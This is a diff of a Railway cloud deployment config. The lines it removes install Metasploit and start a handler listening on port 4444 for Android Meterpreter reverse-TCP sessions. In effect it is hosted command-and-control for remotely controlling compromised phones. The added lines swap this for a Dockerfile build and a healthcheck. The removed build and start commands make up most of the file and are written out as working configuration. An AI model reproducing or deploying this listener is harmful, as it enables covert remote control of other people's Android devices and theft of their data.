@@ -1,27 +1,10 @@
 {
   "$schema": "https://railway.app/railway.schema.json",
   "build": {
-    "builder": "NIXPACKS",
-    "nixpacksPlan": {
-      "providers": ["ruby"],
-      "phases": {
-        "setup": {
-          "nixPkgs": ["ruby_3_2", "postgresql_14", "git", "bundler", "libpq", "bash"]
-        },
-        "install": {
-          "cmds": [
-            "git clone --depth 1 https://github.com/rapid7/metasploit-framework.git /tmp/msf || (echo 'Clone failed, retrying shallow...' && git clone --depth 1 https://github.com/rapid7/metasploit-framework.git /tmp/msf)",
-            "cp -r /tmp/msf /app/msf",
-            "cd /app/msf && bundle install --without development test --path vendor/bundle --jobs 2",  # jobs 2 برای سرعت
-            "export PATH=/app/msf:$PATH",
-            "cd /app/msf && msfdb init || echo 'DB init skipped, will run in runtime'"
-          ]
-        }
-      }
-    }
+    "builder": "DOCKERFILE"
   },
   "deploy": {
-    "startCommand": "bash -c 'if [ -d \"/app/msf\" ]; then cd /app/msf && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j\"; else echo \"Manual clone fallback...\" && git clone --depth 1 https://github.com/rapid7/metasploit-framework.git /app/msf && cd /app/msf && bundle install --without development test --path vendor/bundle && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j\"; fi'",
-    "restartPolicyType": "ON_FAILURE"
+    "restartPolicyType": "ON_FAILURE",
+    "healthcheckPath": "/"
   }
 }
